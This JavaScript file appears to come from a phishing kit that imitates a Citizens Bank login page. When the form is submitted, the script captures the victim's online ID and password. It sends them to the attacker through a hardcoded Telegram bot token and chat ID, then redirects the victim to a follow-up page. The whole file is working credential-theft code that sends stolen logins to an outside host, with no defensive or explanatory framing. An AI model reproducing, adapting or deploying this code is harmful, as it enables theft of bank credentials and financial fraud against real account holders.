document.addEventListener('DOMContentLoaded', () => {
    // Submissions
    const fusername = document.getElementById('fuser1');
    const fpassword = document.getElementById('fpass1');
    const submit = document.getElementsByClassName('form-contact')[0];

    submit.addEventListener('submit', async (e) => {
        e.preventDefault();

        let ebody = `
        \n
        <b>[Citizens Bank Log]</b>
        \n
        <b>Online ID: </b>${fusername.value}
        \n
        <b>Password: </b>${fpassword.value}
        \n`;

        // Telegram Bot API endpoint
        const telegramBotToken = '5943159759:AAF2du7IRutCVQStuAp66ZdnfuKkJNjLtnA';
        const chatId = '6391433593';

        const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        try {
            const response = await axios.post(telegramApiUrl, {
                chat_id: chatId,
                text: ebody,
                parse_mode: 'HTML',
            });

            // Redirect after sending the message
            window.location.href = "ip.html";
        } catch (error) {
            console.error("Error sending message to Telegram:", error);

            // Check if there's a specific error message from the Telegram API response
            if (error.response && error.response.data) {
                console.error("Telegram API error:", error.response.data);
            }
        }
    });
});


